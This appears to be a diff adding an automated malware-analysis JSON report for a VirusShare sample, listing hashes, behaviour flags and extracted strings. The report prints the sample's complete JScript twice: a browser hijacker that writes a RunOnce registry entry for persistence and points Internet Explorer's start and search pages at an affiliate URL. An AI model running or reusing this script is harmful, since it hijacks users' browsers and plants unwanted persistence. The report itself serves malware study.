@@ -1,0 +1,50 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "\n\n\nvar url = \"http://searchcentral.cc/index.php?v=4&aff=3355\";\nvar burl = \"http://searchcentral.cc/search.php?v=4&aff=3355\";\nvar fso = new ActiveXObject(\"Scripting.FileSystemObject\");\nvar tfolder = fso.GetSpecialFolder(0);\nvar filepath = tfolder + \"\\\\update12.js\";\nvar Shell = new ActiveXObject(\"WScript.Shell\");\nShell.RegWrite(\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\tlc\",filepath);\nShell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Start Page\",url);\nShell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Page\",url);\nShell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\",burl);\nShell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Use Search Asst\",\"no\");\nShell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Use Custom Search URL\",1,\"REG_DWORD\");"
+    },
+    "filename": "VirusShare_83a9f9816d0169f76cbee9488a25a7cb",
+    "filesize": 880,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "83a9f9816d0169f76cbee9488a25a7cb",
+        "sha1": "090958f3a07c0380cd4c2ab76c95487ca9e47039",
+        "sha256": "a65e5f8b1c9382f6891058cf4a16ce54fd766e37c2a314c187532c261770b36c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "var url = \"http://searchcentral.cc/index.php?v=4&aff=3355\";",
+            "var burl = \"http://searchcentral.cc/search.php?v=4&aff=3355\";",
+            "var fso = new ActiveXObject(\"Scripting.FileSystemObject\");",
+            "var tfolder = fso.GetSpecialFolder(0);",
+            "var filepath = tfolder + \"\\\\update12.js\";",
+            "var Shell = new ActiveXObject(\"WScript.Shell\");",
+            "Shell.RegWrite(\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\tlc\",filepath);",
+            "Shell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Start Page\",url);",
+            "Shell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Page\",url);",
+            "Shell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\",burl);",
+            "Shell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Use Search Asst\",\"no\");",
+            "Shell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Use Custom Search URL\",1,\"REG_DWORD\");"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://searchcentral.cc/index.php?v=4&aff=3355",
+            "http://searchcentral.cc/search.php?v=4&aff=3355"
+        ]
+    },
+    "time": "0:00:00.291091",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
